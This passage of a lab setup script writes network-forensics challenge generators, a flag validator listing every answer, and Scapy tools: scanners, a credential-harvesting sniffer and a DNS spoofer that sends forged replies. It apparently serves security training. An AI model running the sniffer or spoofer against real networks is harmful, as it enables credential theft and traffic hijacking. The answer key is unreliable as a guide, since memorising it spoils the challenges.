    print("[*] Creating Challenge 2: C2 Beacon")

    packets = []

    # Simulate beaconing to port 443
    for i in range(10):
        # DNS query for suspicious domain
        dns_query = IP(src="192.168.1.100", dst="8.8.8.8")/UDP(sport=50000+i, dport=53)/DNS(rd=1, qd=DNSQR(qname="beacon.malware.evil"))
        packets.append(dns_query)

        # HTTPS beacon to 443 (the flag hint)
        syn = IP(src="192.168.1.100", dst="203.0.113.50")/TCP(sport=50000+i, dport=443, flags="S", seq=1000+i*100)
        packets.append(syn)

        syn_ack = IP(src="203.0.113.50", dst="192.168.1.100")/TCP(sport=443, dport=50000+i, flags="SA", seq=2000+i*100, ack=1001+i*100)
        packets.append(syn_ack)

    # Add comment in a packet payload as hint
    hint_pkt = IP(src="192.168.1.100", dst="203.0.113.50")/TCP(sport=50010, dport=443, flags="PA")/Raw(load="FLAG{c2_b34c0n_1d3nt1f13d_443}")
    packets.append(hint_pkt)

    wrpcap(f"{PCAP_DIR}/challenge2_c2beacon.pcap", packets)
    print(f"    Saved: {PCAP_DIR}/challenge2_c2beacon.pcap")

def create_ftp_transfer_pcap():
    """Challenge 3: FTP file transfer"""
    print("[*] Creating Challenge 3: FTP Transfer")

    packets = []
    client_ip = "192.168.1.100"
    server_ip = "192.168.1.1"

    # FTP control connection
    # 220 Welcome
    packets.append(IP(src=server_ip, dst=client_ip)/TCP(sport=21, dport=45000, flags="PA")/Raw(load="220 Welcome to FTP\r\n"))

    # USER anonymous
    packets.append(IP(src=client_ip, dst=server_ip)/TCP(sport=45000, dport=21, flags="PA")/Raw(load="USER anonymous\r\n"))
    packets.append(IP(src=server_ip, dst=client_ip)/TCP(sport=21, dport=45000, flags="PA")/Raw(load="331 Password required\r\n"))

    # PASS
    packets.append(IP(src=client_ip, dst=server_ip)/TCP(sport=45000, dport=21, flags="PA")/Raw(load="PASS test@test.com\r\n"))
    packets.append(IP(src=server_ip, dst=client_ip)/TCP(sport=21, dport=45000, flags="PA")/Raw(load="230 Login successful\r\n"))

    # RETR secret.txt
    packets.append(IP(src=client_ip, dst=server_ip)/TCP(sport=45000, dport=21, flags="PA")/Raw(load="RETR secret.txt\r\n"))
    packets.append(IP(src=server_ip, dst=client_ip)/TCP(sport=21, dport=45000, flags="PA")/Raw(load="150 Opening data connection\r\n"))

    # FTP-DATA with file contents (contains flag)
    file_content = "SECRET FILE CONTENTS\n\nThe secret code is: FLAG{ftp_f1l3_r3c0v3r3d_s3cr3t}\n\nEnd of file."
    packets.append(IP(src=server_ip, dst=client_ip)/TCP(sport=20, dport=45001, flags="PA")/Raw(load=file_content))

    packets.append(IP(src=server_ip, dst=client_ip)/TCP(sport=21, dport=45000, flags="PA")/Raw(load="226 Transfer complete\r\n"))

    wrpcap(f"{PCAP_DIR}/challenge3_ftp.pcap", packets)
    print(f"    Saved: {PCAP_DIR}/challenge3_ftp.pcap")

def create_dns_tunnel_pcap():
    """Challenge 4: DNS tunneling"""
    print("[*] Creating Challenge 4: DNS Tunneling")

    packets = []

    # The flag encoded in base64, split across DNS queries
    flag = "FLAG{dns_tunn3l_d4t4_3xtr4ct3d}"
    encoded = base64.b64encode(flag.encode()).decode()

    # Split into chunks for subdomains
    chunks = [encoded[i:i+20] for i in range(0, len(encoded), 20)]

    for i, chunk in enumerate(chunks):
        subdomain = f"{chunk}.data.tunnel.example.com"
        dns_query = IP(src="192.168.1.100", dst="192.168.1.1")/UDP(sport=50000+i, dport=53)/DNS(rd=1, qd=DNSQR(qname=subdomain))
        packets.append(dns_query)

        # Response
        dns_resp = IP(src="192.168.1.1", dst="192.168.1.100")/UDP(sport=53, dport=50000+i)/DNS(
            id=dns_query[DNS].id, qr=1, aa=1, qd=dns_query[DNS].qd,
            an=DNSRR(rrname=subdomain, type="A", rdata="127.0.0.1"))
        packets.append(dns_resp)

    # Add some normal DNS for cover
    for domain in ["google.com", "facebook.com", "example.com"]:
        packets.append(IP(src="192.168.1.100", dst="8.8.8.8")/UDP(sport=53001, dport=53)/DNS(rd=1, qd=DNSQR(qname=domain)))

    wrpcap(f"{PCAP_DIR}/challenge4_dns_tunnel.pcap", packets)
    print(f"    Saved: {PCAP_DIR}/challenge4_dns_tunnel.pcap")

def create_http_session_pcap():
    """Challenge 5: HTTP session reconstruction"""
    print("[*] Creating Challenge 5: HTTP Session")

    packets = []
    client_ip = "192.168.1.100"
    server_ip = "192.168.1.1"

    # Request 1: GET /
    http_req1 = "GET / HTTP/1.1\r\nHost: example.com\r\nUser-Agent: Mozilla/5.0\r\n\r\n"
    packets.append(IP(src=client_ip, dst=server_ip)/TCP(sport=45000, dport=80, flags="PA")/Raw(load=http_req1))

    http_resp1 = "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nX-Secret-Header: FLAG{http_s3ss10n_r3c0nstruct3d}\r\n\r\n<html><body><h1>Welcome</h1><!-- Check headers --></body></html>"
    packets.append(IP(src=server_ip, dst=client_ip)/TCP(sport=80, dport=45000, flags="PA")/Raw(load=http_resp1))

    # Request 2: GET /about
    http_req2 = "GET /about HTTP/1.1\r\nHost: example.com\r\n\r\n"
    packets.append(IP(src=client_ip, dst=server_ip)/TCP(sport=45001, dport=80, flags="PA")/Raw(load=http_req2))

    http_resp2 = "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<html><body><h1>About</h1></body></html>"
    packets.append(IP(src=server_ip, dst=client_ip)/TCP(sport=80, dport=45001, flags="PA")/Raw(load=http_resp2))

    wrpcap(f"{PCAP_DIR}/challenge5_http.pcap", packets)
    print(f"    Saved: {PCAP_DIR}/challenge5_http.pcap")

if __name__ == "__main__":
    os.makedirs(PCAP_DIR, exist_ok=True)
    print("=== PCAP Challenge Generator ===\n")

    create_password_exfil_pcap()
    create_c2_beacon_pcap()
    create_ftp_transfer_pcap()
    create_dns_tunnel_pcap()
    create_http_session_pcap()

    print("\n[+] All PCAP files generated!")
    print(f"[+] Location: {PCAP_DIR}")
PCAPGEN_EOF

    chmod +x "${SCRIPTS_DIR}/forensics/generate_pcaps.py"

    log "Running PCAP generator..."
    python3 "${SCRIPTS_DIR}/forensics/generate_pcaps.py" 2>/dev/null || warn "PCAP generation requires scapy"

    log "PCAP challenges created"
}

#===============================================================================
# Create WPA Handshake Sample
#===============================================================================

create_wireless_samples() {
    header "Creating Wireless Sample Files"

    # Create a simple placeholder for WPA handshake (would need real capture in practice)
    log "Creating WPA handshake sample..."

    cat > "${SCRIPTS_DIR}/forensics/create_wpa_sample.py" << 'WPAGEN_EOF'
#!/usr/bin/env python3
"""Create a sample WPA handshake capture for educational purposes"""
from scapy.all import *
import os

WIRELESS_DIR = "/var/www/html/network-labs/wireless-lab/captures"

def create_fake_handshake():
    """Create educational EAPOL frames (simplified for learning)"""
    os.makedirs(WIRELESS_DIR, exist_ok=True)

    packets = []

    # Note: This is a simplified educational example
    # Real WPA handshakes require specific EAPOL key data

    # Beacon frame (simplified)
    ssid = "TestNetwork"

    # EAPOL frames (educational structure)
    # In reality these need proper key data for aircrack-ng
    eapol1 = Ether(dst="ff:ff:ff:ff:ff:ff", src="00:11:22:33:44:55")/Raw(load=b"\x88\x8e" + b"\x00" * 100)
    eapol2 = Ether(dst="00:11:22:33:44:55", src="aa:bb:cc:dd:ee:ff")/Raw(load=b"\x88\x8e" + b"\x01" * 100)
    eapol3 = Ether(dst="aa:bb:cc:dd:ee:ff", src="00:11:22:33:44:55")/Raw(load=b"\x88\x8e" + b"\x02" * 100)
    eapol4 = Ether(dst="00:11:22:33:44:55", src="aa:bb:cc:dd:ee:ff")/Raw(load=b"\x88\x8e" + b"\x03" * 100)

    packets = [eapol1, eapol2, eapol3, eapol4]

    # Save as cap file
    wrpcap(f"{WIRELESS_DIR}/wpa_handshake.cap", packets)
    print(f"[+] Created sample at {WIRELESS_DIR}/wpa_handshake.cap")
    print("[!] Note: This is a simplified educational sample")
    print("[!] For real cracking practice, use proper capture tools")

if __name__ == "__main__":
    create_fake_handshake()
WPAGEN_EOF

    chmod +x "${SCRIPTS_DIR}/forensics/create_wpa_sample.py"
    python3 "${SCRIPTS_DIR}/forensics/create_wpa_sample.py" 2>/dev/null || warn "WPA sample generation requires scapy"

    log "Wireless samples created"
}

#===============================================================================
# Create Helper Scripts
#===============================================================================

create_helper_scripts() {
    header "Creating Helper Scripts"

    # Traffic Generator
    log "Creating traffic generator..."
    cat > "${SCRIPTS_DIR}/traffic/traffic-generator.py" << 'TRAFFIC_EOF'
#!/usr/bin/env python3
"""Generate various traffic patterns for capture and analysis"""

import argparse
import subprocess
import socket
import time
import sys

def generate_http():
    """Generate HTTP traffic"""
    print("[*] Generating HTTP traffic...")
    try:
        import requests
        for path in ["/", "/about", "/contact", "/login"]:
            try:
                requests.get(f"http://localhost{path}", timeout=2)
                print(f"    GET {path}")
            except:
                pass

        # POST with credentials
        requests.post("http://localhost/login", data={
            "username": "admin",
            "password": "FLAG{p4ssw0rd_3xf1ltr4t10n_d3t3ct3d}"
        }, timeout=2)
        print("    POST /login (with credentials)")
    except ImportError:
        print("[!] requests module not found, using curl")
        subprocess.run(["curl", "-s", "http://localhost/"], capture_output=True)

def generate_dns():
    """Generate DNS queries"""
    print("[*] Generating DNS traffic...")
    domains = ["google.com", "facebook.com", "example.com", "github.com"]
    for domain in domains:
        try:
            socket.gethostbyname(domain)
            print(f"    Query: {domain}")
        except:
            pass
    time.sleep(0.5)

def generate_ftp():
    """Generate FTP traffic"""
    print("[*] Generating FTP traffic...")
    print("    [!] FTP requires vsftpd running: sudo systemctl start vsftpd")
    try:
        from ftplib import FTP
        ftp = FTP()
        ftp.connect("localhost", 21, timeout=5)
        ftp.login("anonymous", "test@example.com")
        ftp.retrlines("LIST")
        ftp.quit()
        print("    FTP session completed")
    except Exception as e:
        print(f"    FTP error: {e}")

def generate_icmp():
    """Generate ICMP traffic"""
    print("[*] Generating ICMP traffic...")
    subprocess.run(["ping", "-c", "5", "127.0.0.1"], capture_output=True)
    print("    Sent 5 ICMP echo requests to localhost")

def main():
    parser = argparse.ArgumentParser(description="Traffic Generator for Network Labs")
    parser.add_argument("--http", action="store_true", help="Generate HTTP traffic")
    parser.add_argument("--dns", action="store_true", help="Generate DNS traffic")
    parser.add_argument("--ftp", action="store_true", help="Generate FTP traffic")
    parser.add_argument("--icmp", action="store_true", help="Generate ICMP traffic")
    parser.add_argument("--all", action="store_true", help="Generate all traffic types")

    args = parser.parse_args()

    if len(sys.argv) == 1:
        parser.print_help()
        return

    print("=== Traffic Generator ===")
    print("Tip: Run tcpdump in another terminal to capture")
    print("     sudo tcpdump -i lo -w /tmp/capture.pcap\n")

    if args.all or args.http:
        generate_http()
    if args.all or args.dns:
        generate_dns()
    if args.all or args.ftp:
        generate_ftp()
    if args.all or args.icmp:
        generate_icmp()

    print("\n[+] Traffic generation complete!")

if __name__ == "__main__":
    main()
TRAFFIC_EOF

    chmod +x "${SCRIPTS_DIR}/traffic/traffic-generator.py"

    # PCAP Challenge Validator
    log "Creating challenge validator..."
    cat > "${SCRIPTS_DIR}/forensics/pcap-validator.py" << 'VALIDATOR_EOF'
#!/usr/bin/env python3
"""Validate flag submissions for PCAP challenges"""

import sys
import hashlib

FLAGS = {
    1: "FLAG{p4ssw0rd_3xf1ltr4t10n_d3t3ct3d}",
    2: "FLAG{c2_b34c0n_1d3nt1f13d_443}",
    3: "FLAG{ftp_f1l3_r3c0v3r3d_s3cr3t}",
    4: "FLAG{dns_tunn3l_d4t4_3xtr4ct3d}",
    5: "FLAG{http_s3ss10n_r3c0nstruct3d}",
    6: "FLAG{1cmp_tunn3l_d4t4_h1dd3n}",
    7: "FLAG{smb_sh4r3_3num3r4t3d}",
    8: "FLAG{t3ln3t_cr3ds_c4ptur3d}"
}

def check_flag(challenge_num, submitted_flag):
    if challenge_num not in FLAGS:
        return False, "Invalid challenge number"

    if submitted_flag.strip() == FLAGS[challenge_num]:
        return True, "Correct! Well done!"
    else:
        return False, "Incorrect. Keep trying!"

def main():
    if len(sys.argv) != 3:
        print("Usage: pcap-validator.py <challenge_number> <flag>")
        print("Example: pcap-validator.py 1 'FLAG{...}'")
        sys.exit(1)

    try:
        challenge = int(sys.argv[1])
        flag = sys.argv[2]
    except ValueError:
        print("Challenge number must be an integer (1-8)")
        sys.exit(1)

    correct, message = check_flag(challenge, flag)

    if correct:
        print(f"[+] Challenge {challenge}: {message}")
    else:
        print(f"[-] Challenge {challenge}: {message}")

if __name__ == "__main__":
    main()
VALIDATOR_EOF

    chmod +x "${SCRIPTS_DIR}/forensics/pcap-validator.py"

    log "Helper scripts created"
}

#===============================================================================
# Standalone Scapy Scripts
#===============================================================================

create_scapy_scripts() {
    header "Creating Standalone Scapy Scripts"

    # ARP Scanner
    log "Creating ARP scanner..."
    cat > "${SCRIPTS_DIR}/scapy/arp_scanner.py" << 'ARPSCAN_EOF'
#!/usr/bin/env python3
"""
ARP Network Scanner - Discover live hosts on local network
Educational tool for network reconnaissance practice
Usage: sudo python3 arp_scanner.py -t 192.168.1.0/24
"""

from scapy.all import ARP, Ether, srp
import argparse
import sys

# Common MAC OUI prefixes for vendor identification
OUI_DATABASE = {
    "00:0c:29": "VMware",
    "00:50:56": "VMware",
    "08:00:27": "VirtualBox",
    "52:54:00": "QEMU/KVM",
    "00:1a:2b": "Cisco",
    "00:1b:21": "Intel",
    "dc:a6:32": "Raspberry Pi",
    "b8:27:eb": "Raspberry Pi",
    "00:0d:b9": "PC Engines",
}

def get_vendor(mac):
    """Lookup vendor from MAC OUI prefix"""
    prefix = mac[:8].lower()
    return OUI_DATABASE.get(prefix, "Unknown")

def scan(target_ip):
    """
    Perform ARP scan on target network
    Returns list of (IP, MAC, Vendor) tuples
    """
    # Create ARP request packet
    # Ether layer: broadcast to ff:ff:ff:ff:ff:ff
    # ARP layer: who-has target_ip
    arp_request = ARP(pdst=target_ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = broadcast / arp_request

    print(f"[*] Scanning {target_ip}...")
    print(f"[*] Sending ARP requests...")

    # Send packet and capture responses
    # timeout=3: wait 3 seconds for responses
    # verbose=False: suppress scapy output
    answered, unanswered = srp(packet, timeout=3, verbose=False)

    results = []
    for sent, received in answered:
        ip = received.psrc
        mac = received.hwsrc
        vendor = get_vendor(mac)
        results.append((ip, mac, vendor))

    return results

def main():
    parser = argparse.ArgumentParser(
        description="ARP Network Scanner - Discover live hosts",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  sudo python3 arp_scanner.py -t 192.168.1.0/24
  sudo python3 arp_scanner.py -t 10.0.0.1-50
  sudo python3 arp_scanner.py -t 192.168.1.0/24 -o results.txt
        """
    )
    parser.add_argument("-t", "--target", required=True,
                        help="Target IP or CIDR range (e.g., 192.168.1.0/24)")
    parser.add_argument("-o", "--output", help="Save results to file")

    args = parser.parse_args()

    try:
        results = scan(args.target)
    except PermissionError:
        print("[-] Error: Must run as root (sudo)")
        sys.exit(1)
    except Exception as e:
        print(f"[-] Error: {e}")
        sys.exit(1)

    if not results:
        print("[-] No hosts found")
        return

    # Display results
    print(f"\n[+] Found {len(results)} host(s):\n")
    print(f"{'IP Address':<18} {'MAC Address':<20} {'Vendor'}")
    print("-" * 60)
    for ip, mac, vendor in sorted(results):
        print(f"{ip:<18} {mac:<20} {vendor}")

    # Save to file if requested
    if args.output:
        with open(args.output, 'w') as f:
            f.write("IP Address,MAC Address,Vendor\n")
            for ip, mac, vendor in results:
                f.write(f"{ip},{mac},{vendor}\n")
        print(f"\n[+] Results saved to {args.output}")

if __name__ == "__main__":
    main()
ARPSCAN_EOF

    chmod +x "${SCRIPTS_DIR}/scapy/arp_scanner.py"

    # Port Scanner
    log "Creating port scanner..."
    cat > "${SCRIPTS_DIR}/scapy/port_scanner.py" << 'PORTSCAN_EOF'
#!/usr/bin/env python3
"""
TCP Port Scanner - Custom implementation using Scapy
Educational tool for understanding port scanning techniques
Usage: sudo python3 port_scanner.py -t 127.0.0.1 -p 1-100
"""

from scapy.all import IP, TCP, sr1, RandShort
import argparse
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
import socket
from time import sleep

def parse_ports(port_spec):
    """Parse port specification (e.g., '80', '1-100', '22,80,443')"""
    ports = []
    for part in port_spec.split(','):
        if '-' in part:
            start, end = map(int, part.split('-'))
            ports.extend(range(start, end + 1))
        else:
            ports.append(int(part))
    return ports

def syn_scan(target, port, timeout=1):
    """
    Perform SYN scan (half-open scan)
    Sends SYN, checks for SYN-ACK response
    """
    try:
        # Create SYN packet
        syn_packet = IP(dst=target) / TCP(
            sport=RandShort(),
            dport=port,
            flags="S"  # SYN flag
        )

        # Send and wait for response
        response = sr1(syn_packet, timeout=timeout, verbose=False)

        if response is None:
            return port, "filtered"
        elif response.haslayer(TCP):
            if response[TCP].flags == 0x12:  # SYN-ACK
                # Send RST to close connection (be polite)
                rst = IP(dst=target) / TCP(
                    sport=syn_packet[TCP].sport,
                    dport=port,
                    flags="R"
                )
                sr1(rst, timeout=0.5, verbose=False)
                return port, "open"
            elif response[TCP].flags == 0x14:  # RST-ACK
                return port, "closed"
        return port, "filtered"
    except Exception as e:
        return port, f"error: {e}"

def connect_scan(target, port, timeout=1):
    """
    Perform connect scan (full TCP handshake)
    Non-privileged alternative to SYN scan
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((target, port))
        sock.close()
        if result == 0:
            return port, "open"
        else:
            return port, "closed"
    except socket.timeout:
        return port, "filtered"
    except Exception as e:
        return port, f"error: {e}"

def banner_grab(target, port, timeout=2):
    """Attempt to grab service banner"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((target, port))
        sock.send(b"HEAD / HTTP/1.0\r\n\r\n")
        banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
        sock.close()
        return banner[:50] if banner else ""
    except:
        return ""

def main():
    parser = argparse.ArgumentParser(
        description="TCP Port Scanner using Scapy",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  sudo python3 port_scanner.py -t 127.0.0.1 -p 22,80,443
  sudo python3 port_scanner.py -t 192.168.1.1 -p 1-1000 --syn
  python3 port_scanner.py -t 127.0.0.1 -p 1-100 --connect --banner
        """
    )
    parser.add_argument("-t", "--target", required=True, help="Target IP address")
    parser.add_argument("-p", "--ports", default="1-1000", help="Ports to scan (default: 1-1000)")
    parser.add_argument("--syn", action="store_true", help="Use SYN scan (requires root)")
    parser.add_argument("--connect", action="store_true", help="Use connect scan (no root needed)")
    parser.add_argument("--banner", action="store_true", help="Grab service banners")
    parser.add_argument("--threads", type=int, default=50, help="Number of threads (default: 50)")
    parser.add_argument("--timeout", type=float, default=1, help="Timeout in seconds (default: 1)")
    parser.add_argument("--delay", type=float, default=0, help="Delay between packets (rate limiting)")

    args = parser.parse_args()

    ports = parse_ports(args.ports)
    scan_func = syn_scan if args.syn else connect_scan
    scan_type = "SYN" if args.syn else "Connect"

    print(f"[*] Target: {args.target}")
    print(f"[*] Ports: {len(ports)} ({args.ports})")
    print(f"[*] Scan type: {scan_type}")
    print(f"[*] Scanning...\n")

    open_ports = []
    closed_count = 0
    filtered_count = 0

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = {}
        for port in ports:
            future = executor.submit(scan_func, args.target, port, args.timeout)
            futures[future] = port
            if args.delay:
                sleep(args.delay)

        for future in as_completed(futures):
            port, status = future.result()
            if status == "open":
                banner = ""
                if args.banner:
                    banner = banner_grab(args.target, port)
                open_ports.append((port, banner))
                print(f"[+] Port {port}: OPEN {banner}")
            elif status == "closed":
                closed_count += 1
            else:
                filtered_count += 1

    print(f"\n[*] Scan complete")
    print(f"[+] Open: {len(open_ports)}")
    print(f"[-] Closed: {closed_count}")
    print(f"[?] Filtered: {filtered_count}")

if __name__ == "__main__":
    main()
PORTSCAN_EOF

    chmod +x "${SCRIPTS_DIR}/scapy/port_scanner.py"

    # Packet Sniffer
    log "Creating packet sniffer..."
    cat > "${SCRIPTS_DIR}/scapy/packet_sniffer.py" << 'SNIFFER_EOF'
#!/usr/bin/env python3
"""
Network Packet Sniffer - Real-time packet capture and analysis
Educational tool for understanding network traffic
Usage: sudo python3 packet_sniffer.py -i eth0
"""

from scapy.all import sniff, wrpcap, IP, TCP, UDP, ICMP, DNS, Raw
import argparse
from datetime import datetime
import re

class PacketSniffer:
    def __init__(self, verbose=False, credentials=False):
        self.packets = []
        self.verbose = verbose
        self.credentials = credentials
        self.cred_patterns = [
            (r'user(?:name)?[=:]\s*([^\s&]+)', 'username'),
            (r'pass(?:word)?[=:]\s*([^\s&]+)', 'password'),
            (r'login[=:]\s*([^\s&]+)', 'login'),
            (r'pwd[=:]\s*([^\s&]+)', 'password'),
        ]

    def extract_credentials(self, payload):
        """Search for potential credentials in payload"""
        found = []
        payload_str = payload.decode('utf-8', errors='ignore').lower()

        for pattern, cred_type in self.cred_patterns:
            matches = re.findall(pattern, payload_str, re.IGNORECASE)
            for match in matches:
                found.append(f"{cred_type}={match}")

        return found

    def packet_callback(self, packet):
        """Process each captured packet"""
        self.packets.append(packet)

        timestamp = datetime.now().strftime("%H:%M:%S")

        if packet.haslayer(IP):
            ip = packet[IP]
            proto = ""
            info = ""

            if packet.haslayer(TCP):
                tcp = packet[TCP]
                proto = "TCP"
                flags = tcp.sprintf("%TCP.flags%")
                info = f"{ip.src}:{tcp.sport} -> {ip.dst}:{tcp.dport} [{flags}]"

                # Check for credentials in payload
                if self.credentials and packet.haslayer(Raw):
                    payload = packet[Raw].load
                    creds = self.extract_credentials(payload)
                    if creds:
                        print(f"\n[!] CREDENTIALS DETECTED: {' '.join(creds)}")

            elif packet.haslayer(UDP):
                udp = packet[UDP]
                proto = "UDP"
                info = f"{ip.src}:{udp.sport} -> {ip.dst}:{udp.dport}"

                if packet.haslayer(DNS):
                    dns = packet[DNS]
                    if dns.qr == 0:  # Query
                        proto = "DNS"
                        info = f"Query: {dns.qd.qname.decode()}"
                    else:  # Response
                        proto = "DNS"
                        info = f"Response: {dns.qd.qname.decode()}"

            elif packet.haslayer(ICMP):
                icmp = packet[ICMP]
                proto = "ICMP"
                types = {0: "Echo Reply", 8: "Echo Request", 3: "Unreachable", 11: "TTL Exceeded"}
                info = f"{ip.src} -> {ip.dst} [{types.get(icmp.type, icmp.type)}]"

            else:
                proto = f"IP({ip.proto})"
                info = f"{ip.src} -> {ip.dst}"

            print(f"[{timestamp}] {proto:5} {info}")

            if self.verbose and packet.haslayer(Raw):
                payload = packet[Raw].load[:100]
                print(f"           Payload: {payload}")

    def start(self, interface, filter_str, count):
        """Start packet capture"""
        print(f"[*] Starting capture on {interface}")
        print(f"[*] Filter: {filter_str or 'none'}")
        print(f"[*] Press Ctrl+C to stop\n")

        try:
            sniff(
                iface=interface,
                filter=filter_str,
                prn=self.packet_callback,
                count=count,
                store=False
            )
        except KeyboardInterrupt:
            print(f"\n[*] Capture stopped")

        return self.packets

def main():
    parser = argparse.ArgumentParser(
        description="Network Packet Sniffer",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  sudo python3 packet_sniffer.py -i eth0
  sudo python3 packet_sniffer.py -i lo -f "tcp port 80"
  sudo python3 packet_sniffer.py -i eth0 --credentials -o capture.pcap
  sudo python3 packet_sniffer.py -i any -f "icmp" -c 10
        """
    )
    parser.add_argument("-i", "--interface", default="eth0", help="Interface to sniff (default: eth0)")
    parser.add_argument("-f", "--filter", help="BPF filter (e.g., 'tcp port 80')")
    parser.add_argument("-c", "--count", type=int, default=0, help="Number of packets (0=infinite)")
    parser.add_argument("-o", "--output", help="Save packets to pcap file")
    parser.add_argument("-v", "--verbose", action="store_true", help="Show packet payloads")
    parser.add_argument("--credentials", action="store_true", help="Detect credentials in traffic")

    args = parser.parse_args()

    sniffer = PacketSniffer(verbose=args.verbose, credentials=args.credentials)

    try:
        packets = sniffer.start(args.interface, args.filter, args.count)
    except PermissionError:
        print("[-] Error: Must run as root (sudo)")
        return

    if args.output and packets:
        wrpcap(args.output, packets)
        print(f"[+] Saved {len(packets)} packets to {args.output}")

if __name__ == "__main__":
    main()
SNIFFER_EOF

    chmod +x "${SCRIPTS_DIR}/scapy/packet_sniffer.py"

    # DNS Spoofer (Educational)
    log "Creating DNS spoofer demo..."
    cat > "${SCRIPTS_DIR}/scapy/dns_spoofer.py" << 'DNSSPOOF_EOF'
#!/usr/bin/env python3
"""
DNS Spoofer - Educational demonstration of DNS spoofing
FOR EDUCATIONAL PURPOSES ONLY - Use in isolated lab environment
Usage: sudo python3 dns_spoofer.py -i lo --spoof example.com=127.0.0.1
"""

from scapy.all import *
import argparse
import sys

class DNSSpoofer:
    def __init__(self, interface, spoof_records):
        self.interface = interface
        self.spoof_records = spoof_records  # {domain: ip}

    def dns_callback(self, packet):
        """Process DNS queries and send spoofed responses"""
        if packet.haslayer(DNSQR):
            query_name = packet[DNSQR].qname.decode().rstrip('.')

            # Check if we should spoof this domain
            spoof_ip = None
            for domain, ip in self.spoof_records.items():
                if domain in query_name or query_name.endswith(domain):
                    spoof_ip = ip
                    break

            if spoof_ip:
                print(f"[+] Spoofing {query_name} -> {spoof_ip}")

                # Build spoofed response
                spoofed_response = (
                    IP(dst=packet[IP].src, src=packet[IP].dst) /
                    UDP(dport=packet[UDP].sport, sport=53) /
                    DNS(
                        id=packet[DNS].id,
                        qr=1,  # Response
                        aa=1,  # Authoritative
                        qd=packet[DNS].qd,
                        an=DNSRR(
                            rrname=packet[DNSQR].qname,
                            type='A',
                            rclass='IN',
                            ttl=300,
                            rdata=spoof_ip
                        )
                    )
                )

                send(spoofed_response, verbose=False)
            else:
                print(f"[*] Ignoring: {query_name}")

    def start(self):
        """Start the DNS spoofer"""
        print(f"[*] DNS Spoofer started on {self.interface}")
        print(f"[*] Spoofing rules:")
        for domain, ip in self.spoof_records.items():
            print(f"    {domain} -> {ip}")
        print(f"[*] Press Ctrl+C to stop\n")

        try:
            sniff(
                iface=self.interface,
                filter="udp port 53",
                prn=self.dns_callback,
                store=False
            )
        except KeyboardInterrupt:
            print("\n[*] Spoofer stopped")

def main():
    parser = argparse.ArgumentParser(
        description="DNS Spoofer - Educational Demo",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
WARNING: For educational purposes only! Use in isolated lab environments.

Examples:
  sudo python3 dns_spoofer.py -i lo --spoof example.com=127.0.0.1
  sudo python3 dns_spoofer.py -i eth0 --spoof google.com=10.0.0.1 --spoof facebook.com=10.0.0.1

How it works:
  1. Sniffs DNS queries on the specified interface
  2. For matching domains, sends spoofed DNS response
  3. The victim receives the fake IP instead of the real one

To test (in separate terminals):
  Terminal 1: sudo python3 dns_spoofer.py -i lo --spoof example.com=6.6.6.6
  Terminal 2: dig @127.0.0.1 example.com
        """
    )
    parser.add_argument("-i", "--interface", default="lo",
                        help="Network interface (default: lo for safety)")
    parser.add_argument("--spoof", action="append", required=True,
                        help="Domain=IP to spoof (can use multiple times)")

    args = parser.parse_args()

    # Parse spoof records
    spoof_records = {}
    for entry in args.spoof:
        try:
            domain, ip = entry.split('=')
            spoof_records[domain] = ip
        except ValueError:
            print(f"[-] Invalid format: {entry}. Use domain=ip")
            sys.exit(1)

    print("\n" + "="*60)
    print("  WARNING: EDUCATIONAL PURPOSES ONLY")
    print("  Only use in isolated lab environments!")
    print("="*60 + "\n")

    spoofer = DNSSpoofer(args.interface, spoof_records)

    try:
        spoofer.start()
    except PermissionError:
        print("[-] Error: Must run as root (sudo)")
        sys.exit(1)

if __name__ == "__main__":
    main()
DNSSPOOF_EOF

    chmod +x "${SCRIPTS_DIR}/scapy/dns_spoofer.py"

    log "Scapy scripts created"
}

#===============================================================================
# Additional PCAP Challenges (6, 7, 8)
#===============================================================================

generate_additional_pcaps() {
    header "Generating Additional PCAP Challenges"

    cat > "${SCRIPTS_DIR}/forensics/generate_additional_pcaps.py" << 'ADDPCAP_EOF'
#!/usr/bin/env python3
"""Generate additional PCAP challenges (6, 7, 8)"""

from scapy.all import *
import base64
import os

PCAP_DIR = "/var/www/html/network-labs/forensics-lab/pcaps"

def create_icmp_tunnel_pcap():
    """Challenge 6: ICMP Tunneling - data hidden in ICMP payload"""
    print("[*] Creating Challenge 6: ICMP Tunneling")

    packets = []
    flag = "FLAG{1cmp_tunn3l_d4t4_h1dd3n}"
    encoded_flag = base64.b64encode(flag.encode()).decode()

    # Split flag across multiple ICMP packets
    chunks = [encoded_flag[i:i+8] for i in range(0, len(encoded_flag), 8)]

    for i, chunk in enumerate(chunks):
        # ICMP echo request with data in payload
        pkt = IP(src="192.168.1.100", dst="192.168.1.1")/ICMP(type=8, id=1337, seq=i)/Raw(load=chunk)
        packets.append(pkt)

        # ICMP echo reply
        reply = IP(src="192.168.1.1", dst="192.168.1.100")/ICMP(type=0, id=1337, seq=i)/Raw(load="OK")
        packets.append(reply)

    # Add some normal pings as cover traffic
    for i in range(5):
        pkt = IP(src="192.168.1.100", dst="8.8.8.8")/ICMP(type=8)/Raw(load="abcdefgh")
        packets.append(pkt)

    wrpcap(f"{PCAP_DIR}/challenge6_icmp_tunnel.pcap", packets)
    print(f"    Saved: {PCAP_DIR}/challenge6_icmp_tunnel.pcap")

def create_smb_pcap():
    """Challenge 7: SMB Enumeration traffic"""
    print("[*] Creating Challenge 7: SMB Enumeration")

    packets = []
    client_ip = "192.168.1.100"
    server_ip = "192.168.1.10"

    # SMB session setup (simplified representation)
    # TCP handshake
    packets.append(IP(src=client_ip, dst=server_ip)/TCP(sport=49152, dport=445, flags="S"))
    packets.append(IP(src=server_ip, dst=client_ip)/TCP(sport=445, dport=49152, flags="SA"))
